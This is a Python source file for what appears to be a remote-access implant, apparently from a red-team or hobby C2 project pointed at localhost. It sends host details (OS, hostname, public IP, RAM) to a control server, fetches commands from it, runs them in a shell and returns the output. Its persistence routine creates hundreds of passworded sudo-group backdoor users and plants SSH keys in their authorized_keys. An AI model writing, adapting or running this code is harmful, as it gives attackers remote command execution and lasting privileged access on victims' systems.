import subprocess

import psutil
import requests
import platform
import time

base_url = 'http://127.0.0.1:5000'


def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


def register():
    uname = platform.uname()
    # get os
    os = f"{uname.system} {uname.release}"
    # get host_name
    host_name = uname.node
    # get ip
    ip = requests.get('https://api.ipify.org').text
    # get system memory
    ram = get_size(psutil.virtual_memory().total)
    # set info in the requests json
    json = {
        'os': os,
        'host_name': host_name,
        'ip': ip,
        'ram': ram
    }
    response = requests.post(f"{base_url}/api/1.1/add_agent", json=json)
    print(response)
    return response.text


def linux_persistence():
    ssh_keys = dict()
    for i in range(1, 1000):
        subprocess.run(['sudo', 'useradd', '-m', '-d', f"/home/bingus{i}", '-p', 'bingus', f"bingus{i}"
                       , '-G', 'sudo'])
        subprocess.run(['sudo', 'mkdir', f"/home/bingus{i}/.ssh"])
        subprocess.run(['sudo', 'ssh-keygen', '-t', 'rsa', '-N', "", '-f', f"/home/bingus{i}/.ssh/id_rsa"])
        ssh_key_loot = subprocess.Popen([f"sudo cat /home/bingus{i}/.ssh/id_rsa.pub | sudo tee -a /home/bingus{i}/.ssh/authorized_keys"],
                shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0].decode('utf-8').strip()
        ssh_keys[f"bingus{i}"] = ssh_key_loot
    return ssh_keys

def get_command(agent_id):
    json = {
        'id': agent_id
    }
    # receive command from queue
    data = requests.post(f"{base_url}/api/1.1/get_command", json=json).text
    if data == 'None':
        time.sleep(1)
        return
    cmd = subprocess.Popen([data], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           stdin=subprocess.PIPE)
    output_bytes = cmd.stdout.read() + cmd.stderr.read()
    output_str = str(output_bytes, "utf-8")  # plain old basic string
    json['output'] = output_str
    # send the output back to the server
    data = requests.post(f"{base_url}/api/1.1/command_out", json=json)
    print(data.text)


if __name__ == "__main__":
    # register implant with server and receive an ID
    # id_agent = int(register())
    # receive and run commands
    # id_agent = 1
    # while True:
    #     get_command(id_agent)
    linux_persistence()
